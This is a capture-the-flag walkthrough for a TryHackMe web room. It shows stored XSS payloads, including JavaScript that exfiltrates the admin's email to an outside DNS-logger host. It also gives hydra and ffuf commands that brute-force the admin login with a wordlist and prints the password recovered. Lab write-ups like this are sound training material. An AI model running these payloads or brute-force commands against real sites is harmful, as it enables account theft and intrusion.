---
date: 2025-02-10
categories: [CTF, THM]
title: "THM - That's The Ticket"
tags: ['hydra', 'ffuf', 'nmap', 'privilege escalation', 'rce', 'xss']

description: "That's The Ticket - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - That's The Ticket

NMAP

![image1](../resources/59b71bff8cea4b2c8d91bf4ce57eed3c.png)
 
- Visit website:
Register an account

- Inspecting the message field:

![image2](../resources/12ab7561f7d54f75b03c89d6564e4636.png)

- We can try XSS:
(Close off the existing textarea tag first)

```bash
</textarea> <script>alert(1)</Script> 

```
or use prompt(1) instead


![image3](../resources/113c81c49dd64c40bd8894c342b46aae.png)

- It's vulnerable

- The cookies are set as HttpOnly and could not be extracted by XSS directly

![image4](../resources/376d11080e20470585cf8474553ea53d.png)

- Room hint:

![image5](../resources/87aab15161f949da98674f2f057ca08f.png)


![image6](../resources/87923bcc9a264223a3afe3baeb009864.png)

- Using the XSS vulnerability, do a call back to the DNS logger (above)
```javascript
</textarea> <img src="http://079a105aecaee7a7a858eca97499a96e.log.tryhackme.tech">

```
- Received 4 hits (3 from us and once from the server - maybe admin)


![image7](../resources/766f4dcc91084210ac47ae6e45a4b8b0.png)

- Get Admin's email:

![image8](../resources/351e6e93882347dda4d8ab127b3faefb.png)

```javascript
</textarea>
<script>
    var email_first = document.getElementById("email").innerHTML.split("@")[0];
    var email_second = document.getElementById("email").innerHTML.split("@")[1];
    var href = "http://localhost." + email_first + "." + email_second + ".40a18b725233ea050562beb6ceaef55d.log.tryhackme.tech/test";
    new Image().src = href;
</script>

```

![image9](../resources/3d86e79e8f894e749ec60caa5c146c74.png)

Don't need subdomain in there really (localhost) - still works


![image10](../resources/41cfa3cce05a4e879e3cf35ad675c754.png)

- Got admin email:
**adminaccount@itsupport.thm**

- Bruteforce the login site:
```bash
hydra -l adminaccount@itsupport.thm -P /usr/share/wordlists/rockyou.txt 10.10.41.5 http-post-form "/login:email=adminaccount@itsupport.thm&password=^PASS^:Invalid"

ffuf -w /usr/share/wordlists/rockyou.txt -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.190.207/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"

```
**<u>Another way:</u>**

Clusterbomb - Save POST request from Burp and edit the parameters

```bash
ffuf -request post.txt -request-proto http -mode clusterbomb -w user.txt:UFUZZ -w /usr/share/wordlists/rockyou.txt:PFUZZ -fc 302

```

![image11](../resources/150619e150ac46e891d9019105a8d2f6.png)

**123123**

- Log in with admin:

![image12](../resources/c406ef06134546a4b16cbf57891bd4c6.png)


![image13](../resources/61fb5c9ca2a343c68516b8f576ea5cc6.png)